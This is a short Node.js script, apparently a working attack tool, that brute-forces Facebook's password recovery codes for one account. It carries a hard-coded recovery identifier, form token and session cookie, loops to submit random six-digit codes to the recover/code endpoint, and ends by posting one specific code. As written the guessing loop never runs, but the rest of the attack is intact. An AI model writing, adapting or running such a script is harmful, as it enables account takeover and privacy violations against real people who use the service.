'use strict';

const log = console.log.bind(console);
const Http2Client = require('./http2-client');
const helpers = require('./helpers');
const child_process = require('node:child_process');
const fs = require('node:fs');

const { rand } = helpers;

const httpClient = new Http2Client(false);

const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';

(async () => {
  const cuid = 'AYio3bhMewAUhanbQTO8t_pTE3ocmDBOjVIa06vpQmNVR6ThpdQ9HrxYVw7yPTkFHNxHxNii8VTKznoVWU38-Tb4F9IKNe4Eus5PJ_xDTeSQ6BWl9UZeqLZTsgZULMKWclC9BMx-K9C83Ya9Ajv-LYbw7ptjvR9B_L48s74PGdLrsBQOGeuGiLmyV5JPs6L1W67vQmdYklomcJ47ThcZ6wS71C8DCzoA4pY6wzhMhJDdOzgpXtxSrlqtUGTurJUGV_n6vkLnJYReiGm7y4hmL5WoSnmags3wvnXOc1qTrQTngQ';
  const lsd = 'AVpc27UCK1s';
  const url = 'https://www.facebook.com/recover/code/?cuid='+cuid;
  const headers = {
    'Cookie': 'datr=F_YuaFQVmcfePVvsUJJtDvkK',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': USER_AGENT,
    'Sec-Fetch-Site': 'same-origin'
  };
  // const codes = require('./codes');

  // child_process.exec('siren warn');

  const p = [];
  for (let i = 0, code; 0 > i; ++i) {
    code = rand(111111, 999999);
    p.push(new Promise(r => httpClient.post(url, headers, 'lsd='+lsd+'&n='+code).then(res => (log(res.statusCode), r()))));
  }

  Promise.all(p).then(() => {
    log('end');
    httpClient.post(url, headers, 'lsd='+lsd+'&n=896475').then(res => log(res.statusCode));
  });
})();